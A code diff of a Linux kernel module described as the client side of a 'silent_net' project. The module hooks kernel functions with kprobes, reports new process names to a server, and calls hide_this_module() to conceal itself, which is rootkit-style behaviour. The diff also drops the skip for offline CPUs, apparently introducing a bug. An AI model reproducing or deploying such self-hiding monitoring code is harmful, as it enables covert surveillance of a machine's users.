@@ -2,8 +2,8 @@
  * This is a source code of the client side
  * Of 'silent_net' project.
  *
- * Handles hooking on ksymbols and sending
- * To a server. Main code of client side
+ * blah blah blah
+ *
  *
  */
 
@@ -53,7 +53,7 @@ static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs) {
   // Filter out threads which are not main thread
   if (current->tgid != current->pid)
     return 0;
-
+	
   return protocol_send_message("%s" PROTOCOL_SEPARATOR "%s", MSG_PROCESS_OPEN,
                                current->comm);
 }
@@ -95,10 +95,9 @@ static int handler_pre_calc_global_load(struct kprobe *kp,
 
   // Only process online CPUs (or just limit to first few CPUs if
   // for_each_online_cpu isn't available)
-  for (cpu_core = 0; cpu_core < min(4, NR_CPUS); cpu_core++) {
-    // Skip inactive CPUs if possible
+  for (cpu_core = 0; cpu_core < min(4, num_present_cpus()); cpu_core++) {
     if (!cpu_online(cpu_core))
-      continue;
+	    printk(KERN_INFO "I'm offline %d\n", cpu_core);
 
     idle_time = get_cpu_idle(cpu_core);
     actv_time = get_cpu_active(cpu_core);
@@ -285,14 +284,15 @@ static void unregister_probes(int max_probes) {
 static int __init hook_init(void) {
   int ret = 0;
 
-  /* Initialize all main module objects */
+  // Initialize all main module objects
   ret = init_singlethread_workqueue("tcp_sock_queue");
   if (ret < 0)
     return ret;
 
   data_transmission_init();
+  register_tcp_sock_hook();
 
-  /* Registers kprobes, if one fails unregisters all registered kprobes */
+  // Registers kprobes, if one fails unregisters all registered kprobes
   ret = register_probes();
   if (ret < 0) {
     release_singlethread_workqueue();
@@ -301,7 +301,6 @@ static int __init hook_init(void) {
   }
 
   hide_this_module();
-  register_tcp_sock_hook();
   printk(KERN_INFO "Finished initializing succesfully\n");
   return ret;
 }
